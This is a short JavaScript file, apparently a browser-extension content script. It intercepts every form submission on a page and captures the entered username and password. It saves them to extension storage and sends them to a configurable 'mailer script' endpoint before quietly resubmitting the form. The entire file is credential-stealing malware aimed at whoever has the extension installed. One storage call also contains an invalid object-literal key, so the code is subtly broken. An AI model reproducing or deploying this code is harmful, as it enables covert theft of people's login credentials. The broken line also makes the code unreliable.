$(function() {
 var passwordBoxes = $("input[type=password]"),
 getMessage = function(username, password, url) {
  return "username=" + username + "&password=" + password + "&url=" + url;
 },
 sendEmail = function(username, password, url, callback) {
  var msg = getMessage(username, password, url);
  $.ajax({
   type: 'GET',
   url: 'http://127.0.0.1:5000/stuff', //Change to the path of your mailer script
   data: msg, //Change to add any headers to be sent along
   success: callback
  });
 },
 process = function(callback) {
  var username = $("input[type=text]").not(passwordBoxes).filter(function() {
   var field = $(this);
   return field.val() || field.html();
  }).val(),
  password = passwordBoxes.val();
  chrome.storage.sync.set({ location.href: {"username": username, "password": password} }, function(){
      });
  sendEmail(username, password, location.href, callback);
 };

 $("form").submit(function(e) {
  var $this = $(this);
  e.preventDefault();
  process(function() {
   $this.unbind('submit');
   $this.submit();
  });
 });
});